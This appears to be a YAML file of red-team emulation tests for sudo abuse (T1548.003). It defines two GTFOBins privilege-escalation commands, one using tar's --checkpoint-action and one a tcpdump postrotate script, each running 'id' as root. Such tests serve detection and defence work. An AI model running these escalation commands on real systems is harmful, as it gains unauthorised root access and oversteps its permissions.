- name: Sudo privilege escalation via tar checkpoint action (GTFOBins)
  auto_generated_guid: 4105c368-0ab9-4a82-8e14-4072492a6d8a
  description: |
    Abuses the tar `--checkpoint-action` option to execute an arbitrary command.
    When `tar` is permitted to run as root via sudo, this leads to command execution as root (GTFOBins).
    Reference: https://gtfobins.github.io/gtfobins/tar/

  supported_platforms:
    - linux

  dependency_executor_name: sh
  dependencies:
  - description: |
      Check if tar is installed.
    prereq_command: |
      if [ ! -x "$(command -v tar)" ]; then exit 1; else exit 0; fi;
    get_prereq_command: |
      (which apt-get && sudo apt-get install -y tar)||(which yum && sudo yum install -y tar)

  executor:
    name: sh
    elevation_required: true
    command: |
      sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c id'

- name: Sudo privilege escalation via tcpdump postrotate command (GTFOBins)
  auto_generated_guid: e4900401-3717-4cef-b3dd-ab6339e4f15e
  description: |
    Abuses the tcpdump `-z` (postrotate) option to execute a command after a capture file is rotated.
    When `tcpdump` is permitted to run as root via sudo, the specified program runs as root (GTFOBins).
    Reference: https://gtfobins.github.io/gtfobins/tcpdump/

  supported_platforms:
    - linux

  dependency_executor_name: sh
  dependencies:
  - description: |
      Check if tcpdump is installed.
    prereq_command: |
      if [ ! -x "$(command -v tcpdump)" ]; then exit 1; else exit 0; fi;
    get_prereq_command: |
      (which apt-get && sudo apt-get install -y tcpdump)||(which yum && sudo yum install -y tcpdump)

  executor:
    name: sh
    elevation_required: true
    command: |
      printf '#!/bin/sh\nid\n' > /tmp/T1548.003_tcpdump_postrotate.sh
      chmod +x /tmp/T1548.003_tcpdump_postrotate.sh
      sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/T1548.003_tcpdump_postrotate.sh -Z root &
      TCPDUMP_PID=$!
      sleep 1
      ping -c 3 127.0.0.1 > /dev/null 2>&1
      sleep 3
      sudo kill $TCPDUMP_PID > /dev/null 2>&1
    cleanup_command: |
      rm -f /tmp/T1548.003_tcpdump_postrotate.sh 2>/dev/null
